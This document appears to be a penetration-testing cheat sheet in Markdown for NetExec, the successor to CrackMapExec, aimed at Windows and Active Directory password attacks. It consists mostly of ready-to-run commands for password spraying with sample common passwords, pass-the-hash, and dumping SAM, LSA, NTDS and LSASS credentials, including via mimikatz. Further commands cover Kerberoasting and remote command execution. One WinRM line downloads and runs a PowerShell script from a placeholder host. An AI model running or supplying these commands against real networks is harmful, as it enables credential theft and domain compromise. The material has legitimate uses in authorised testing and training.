---
tags: [pentest, brute-force, netexec, crackmapexec, credentials, ad, initial-access, windows]
tool: netexec
phase: 5
---
# NetExec (nxc) - Password Attacks

The successor to CrackMapExec. **Use this** for Windows / AD password attacks - it's safer than Hydra (reads lockout policy), faster, and supports every relevant protocol.

[[06 - Gaining Access/00 - README|Folder index]]

## Install

```bash
# Kali (apt)
sudo apt install netexec

# Or pip (latest)
pipx install netexec
nxc --version
```

## Protocols supported

```text
smb       SMB / 445
ldap      LDAP / 389
mssql     MSSQL / 1433
winrm     WinRM / 5985
wmi       WMI / 135
rdp       RDP / 3389
ssh       SSH / 22
ftp       FTP / 21
nfs       NFS / 2049
vnc       VNC / 5900
```

## Syntax

```bash
nxc <protocol> <target> -u <user(s)> -p <pass(es)> [opts]
```

| Flag | Meaning |
| --- | --- |
| `-u user` / `-u users.txt` | username(s) |
| `-p pass` / `-p pass.txt` | password(s) |
| `-H hash` | NTLM hash (PtH) |
| `--local-auth` | local SAM (vs. domain) |
| `-d corp.local` | domain |
| `-k` | Kerberos auth |
| `--no-bruteforce` | spray mode - one pass at a time |
| `--continue-on-success` | don't stop at first hit |
| `--pass-pol` | read policy (do this first!) |
| `-x cmd` | execute a single command (after auth) |
| `-X "..."` | execute PowerShell |
| `--shares` | list shares |
| `--users` / `--groups` | enumerate |

## The right order of operations

### Step 0: Check policy

```bash
nxc smb <ip> -u user -p '' --pass-pol
# Look for:  Account lockout threshold: 5
# Spray within that threshold.
```

### Step 1: Validate one cred works

```bash
nxc smb <ip> -u user -p pass
# Pwn3d!: True   ← admin
# [+] (no symbol)  ← valid, low-priv
# [-] STATUS_LOGON_FAILURE ← bad cred
```

### Step 2: Spray (NOT brute)

```bash
# 1 password across many users
nxc smb <range> -u users.txt -p 'Welcome2026!' --continue-on-success

# Common spray candidates
nxc smb <range> -u users.txt -p 'Spring2026!'
nxc smb <range> -u users.txt -p 'Password1'
nxc smb <range> -u users.txt -p 'Hello123!'
nxc smb <range> -u users.txt -p '<Company>1!'
```

### Step 3: Try cred everywhere

```bash
for proto in smb winrm mssql rdp ssh ftp ldap; do
  nxc $proto <ip> -u found_user -p found_pass
done
```

## Pass-the-hash

```bash
nxc smb <range> -u admin -H <NTLM> --local-auth
nxc smb <ip> -u admin -H <NTLM> -d corp.local
nxc winrm <ip> -u admin -H <NTLM>
```

## Beyond auth - useful nxc tricks

```bash
# Dump SAM from compromised box
nxc smb <ip> -u admin -p pass --sam
nxc smb <ip> -u admin -p pass --lsa

# Dump NTDS (DC)
nxc smb <dc-ip> -u DA -p pass --ntds

# List shares + permissions
nxc smb <ip> -u user -p pass --shares
nxc smb <ip> -u user -p pass -M spider_plus

# Get a session via WinRM
nxc winrm <ip> -u admin -p pass -x "whoami /priv"
nxc winrm <ip> -u admin -p pass -X "(New-Object Net.WebClient).DownloadString('http://x/s.ps1')"

# MSSQL command exec
nxc mssql <ip> -u sa -p pass --local-auth -x whoami
nxc mssql <ip> -u sa -p pass --local-auth --xp-cmdshell --enum-priv

# LDAP enumeration
nxc ldap <ip> -u user -p pass --users
nxc ldap <ip> -u user -p pass --asreproast asrep.txt
nxc ldap <ip> -u user -p pass --kerberoasting kerb.txt

# RID brute (no creds even - null session)
nxc smb <ip> -u '' -p '' --rid-brute
```

## Status indicators

```text
[+] CORP.LOCAL\admin:Pass1   Pwn3d!     = admin / local admin
[+] CORP.LOCAL\bob:Pass1                = valid, not admin
[-] CORP.LOCAL\bob:Pass1 STATUS_LOGON_FAILURE  = wrong cred
[-] CORP.LOCAL\bob:Pass1 STATUS_ACCOUNT_LOCKED_OUT = !!! STOP
[-] STATUS_PASSWORD_MUST_CHANGE        = valid cred but expired; reset
```

## Modules (`-L` to list)

```bash
nxc smb -L                                  # list modules
nxc smb <ip> -u user -p pass -M lsassy      # remote LSASS dump
nxc smb <ip> -u user -p pass -M spider_plus # share spider
nxc smb <ip> -u user -p pass -M gpp_password # GPP cpassword decrypt
nxc smb <ip> -u user -p pass -M mimikatz    # run mimikatz remotely
nxc ldap <ip> -u user -p pass -M adcs       # AD CS template enum
nxc ldap <ip> -u user -p pass -M get-network # subnets / DNS
```

## When you see X, do Y

| Result | Action |
| --- | --- |
| `Pwn3d!: True` on any host | You have local admin → secretsdump/lsassy/wmiexec |
| Valid cred but no Pwn3d | Try WinRM, RDP, MSSQL. Might be RemoteManagement Users or DBA. |
| `STATUS_ACCOUNT_LOCKED_OUT` | Stop spraying immediately. Wait out the lockout window. |
| `STATUS_PASSWORD_MUST_CHANGE` | Use smbpasswd to set a new password (with the old one) |
| `KDC_ERR_PREAUTH_REQUIRED` (LDAP/Kerberos) | Cred is invalid (paradoxically; means user exists but pass wrong) |
| `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` | User does not exist |

## See also

- [[05 - Password Spraying Strategy]] - the right way to attack many users
- [[13 - Impacket Suite Overview]] - what to do after nxc
